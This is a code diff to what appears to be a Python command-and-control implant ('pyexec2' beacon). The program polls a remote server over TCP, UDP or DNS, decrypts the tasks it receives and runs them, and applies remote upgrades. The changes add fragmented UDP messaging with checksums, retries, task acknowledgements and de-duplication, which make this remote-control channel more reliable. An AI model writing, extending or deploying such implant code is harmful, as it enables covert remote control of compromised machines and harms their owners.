@@ -16,6 +16,7 @@ import threading
 import time
 import traceback
 import urllib.request
+import zlib
 
 CONFIG = __CONFIG_JSON__
 SERVER_HOST = CONFIG["host"]
@@ -335,6 +336,9 @@ G = {
     "lock": threading.RLock(),
     "active_tasks": {},
     "results": [],
+    "pending_task_acks": [],
+    "seen_task_ids": set(),
+    "ack_due": False,
     "interval_override": None,
     "forked": False,
     "pending_upgrade": None,
@@ -452,13 +456,89 @@ def _tcp_request(outer):
         return json.loads(data.decode("utf-8"))
 
 
+UDP_MAX_DATAGRAM = 1200
+UDP_CHUNK_BYTES = 700
+UDP_RESPONSE_TIMEOUT = 1.5
+
+
+def _udp_fragments(raw, kind, message_id=None):
+    message_id = message_id or secrets.token_hex(12)
+    digest = hashlib.sha256(raw).hexdigest()
+    total = max(1, (len(raw) + UDP_CHUNK_BYTES - 1) // UDP_CHUNK_BYTES)
+    packets = []
+    for index in range(total):
+        chunk = raw[index * UDP_CHUNK_BYTES:(index + 1) * UDP_CHUNK_BYTES]
+        packet = {
+            "v": 1,
+            "t": kind,
+            "m": message_id,
+            "i": index,
+            "n": total,
+            "h": digest,
+            "c": f"{zlib.crc32(chunk) & 0xffffffff:08x}",
+            "d": base64.b64encode(chunk).decode("ascii"),
+        }
+        encoded = json.dumps(packet, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
+        if len(encoded) > UDP_MAX_DATAGRAM:
+            raise RuntimeError(f"UDP fragment exceeds {UDP_MAX_DATAGRAM} bytes")
+        packets.append(encoded)
+    return packets
+
+
 def _udp_request(outer):
-    body = json.dumps(outer).encode("utf-8")
+    body = json.dumps(outer, ensure_ascii=False).encode("utf-8")
+    pieces = _udp_fragments(body, "req")
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-        sock.settimeout(30)
-        sock.sendto(body, (G["server_host"], G["server_port"]))
-        data, _ = sock.recvfrom(65535)
-        return json.loads(data.decode("utf-8"))
+        sock.settimeout(0.25)
+        for piece in pieces:
+            sock.sendto(piece, (G["server_host"], G["server_port"]))
+        deadline = time.time() + UDP_RESPONSE_TIMEOUT
+        response_message = None
+        response_total = None
+        response_chunks = {}
+        response_digest = ""
+        while time.time() < deadline:
+            try:
+                data, _ = sock.recvfrom(65535)
+            except socket.timeout:
+                continue
+            try:
+                packet = json.loads(data.decode("utf-8"))
+            except Exception:
+                continue
+            # Compatibility with an unfragmented old response.
+            if packet.get("v") != 1:
+                if "data" in packet:
+                    return packet
+                continue
+            if packet.get("t") != "resp":
+                continue
+            message_id = str(packet.get("m", ""))
+            try:
+                index = int(packet.get("i", 0))
+                total = int(packet.get("n", 1))
+                chunk = base64.b64decode(packet.get("d", ""))
+            except Exception:
+                continue
+            if total < 1 or total > 256 or index < 0 or index >= total:
+                continue
+            if response_message is None:
+                response_message = message_id
+                response_total = total
+                response_digest = str(packet.get("h", ""))
+            if message_id != response_message or total != response_total:
+                continue
+            expected_crc = str(packet.get("c", ""))
+            actual_crc = f"{zlib.crc32(chunk) & 0xffffffff:08x}"
+            if expected_crc and expected_crc != actual_crc:
+                continue
+            response_chunks[index] = chunk
+            if len(response_chunks) == response_total:
+                raw = b"".join(response_chunks[i] for i in range(response_total))
+                if response_digest and hashlib.sha256(raw).hexdigest() != response_digest:
+                    raise RuntimeError("UDP response checksum mismatch")
+                return json.loads(raw.decode("utf-8"))
+        raise TimeoutError("UDP response timeout")
 
 
 def _encode_dns_name(name):
@@ -567,25 +647,58 @@ def _poll_once():
     snapshot, pending_count = _poll_result_batch()
     beacon_snapshot = dict(G["beacon"])
     beacon_snapshot["cwd"] = os.getcwd()
-    inner = {
-        "kind": "poll",
-        "beacon": beacon_snapshot,
-        "protocol": G["protocol"],
-        "results": snapshot,
-        "heartbeat": dict(G["heartbeat"]),
-    }
-    if CONFIG.get("replay_protection"):
-        inner["sent_at"] = time.time()
-        inner["nonce"] = secrets.token_hex(16)
-    outer = _outer_request(inner)
-    response_outer = _transport_request(outer)
-    raw = open_seal(KEY, base64.b64decode(response_outer["data"]), b"pyexec2-server")
-    response = json.loads(raw.decode("utf-8"))
+    request_id = "req_" + secrets.token_hex(16)
+    attempts = 3 if G["protocol"] == "udp" else 1
+    response = None
+    sent_acks = set()
+    last_error = None
+    for attempt in range(attempts):
+        with G["lock"]:
+            task_ack = list(G["pending_task_acks"])
+        sent_acks = set(task_ack)
+        inner = {
+            "kind": "poll",
+            "request_id": request_id,
+            "beacon": beacon_snapshot,
+            "protocol": G["protocol"],
+            "results": snapshot,
+            "task_ack": task_ack,
+            "heartbeat": dict(G["heartbeat"]),
+        }
+        if CONFIG.get("replay_protection"):
+            inner["sent_at"] = time.time()
+            inner["nonce"] = secrets.token_hex(16)
+        outer = _outer_request(inner)
+        try:
+            response_outer = _transport_request(outer)
+            raw = open_seal(KEY, base64.b64decode(response_outer["data"]), b"pyexec2-server")
+            candidate = json.loads(raw.decode("utf-8"))
+            if candidate.get("request_id") and candidate.get("request_id") != request_id:
+                raise RuntimeError("UDP response request_id mismatch")
+            response = candidate
+            break
+        except Exception as exc:
+            last_error = exc
+            if attempt + 1 >= attempts:
+                raise
+            time.sleep(0.15)
+    if response is None:
+        raise last_error or RuntimeError("poll failed")
+    if sent_acks:
+        with G["lock"]:
+            G["pending_task_acks"] = [item for item in G["pending_task_acks"] if item not in sent_acks]
     acked = set(response.get("ack_results", []))
     if acked:
         with G["lock"]:
             G["results"] = [item for item in G["results"] if item.get("result_id") not in acked and item.get("task_id") not in acked]
     tasks = response.get("tasks", [])
+    if tasks:
+        with G["lock"]:
+            for task in tasks:
+                task_id = str(task.get("task_id", ""))
+                if task_id and task_id not in G["pending_task_acks"]:
+                    G["pending_task_acks"].append(task_id)
+            G["ack_due"] = True
     for task in tasks:
         _start_task(task)
     if response.get("upgrade_apply"):
@@ -594,12 +707,14 @@ def _poll_once():
         os._exit(0)
     return len(tasks), response
 
-
 def _start_task(task):
     task_id = task["task_id"]
     with G["lock"]:
-        if task_id in G["active_tasks"]:
+        if task_id in G["active_tasks"] or task_id in G["seen_task_ids"]:
             return
+        G["seen_task_ids"].add(task_id)
+        if len(G["seen_task_ids"]) > 2048:
+            G["seen_task_ids"] = set(list(G["seen_task_ids"])[-1024:])
         G["active_tasks"][task_id] = {
             "thread_id": None,
             "cancel": threading.Event(),
@@ -681,9 +796,11 @@ def main():
                 G["interval_override"] = None
                 next_poll = min(next_poll, time.time())
         now = time.time()
+        with G["lock"]:
+            force_ack_poll = bool(G.pop("ack_due", False))
         has_results = bool(G["results"])
         result_due = has_results and (now - LAST_RESULT_AT >= float(CONFIG["finish_delay"])) and now >= result_retry_at
-        if now >= next_poll or result_due:
+        if now >= next_poll or result_due or force_ack_poll:
             try:
                 task_count, response = _poll_once()
                 if task_count > 0 or G["active_tasks"]:
